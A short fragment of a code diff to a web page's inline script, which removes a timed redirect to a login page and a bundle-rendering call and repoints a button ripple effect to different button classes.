-  setTimeout(function(){window.location.href='bundles-login.html';},120);
-});
-
-document.querySelectorAll('.buy-btn,.cta').forEach(function(b){
+// Ripple on foot buttons
+document.querySelectorAll('.foot-btn,.pin-act').forEach(function(b){
   b.addEventListener('pointerdown',function(e){ripple(b,e);},{passive:true});
 });
-
-renderBundles();
 </script>
 </body>
 </html>
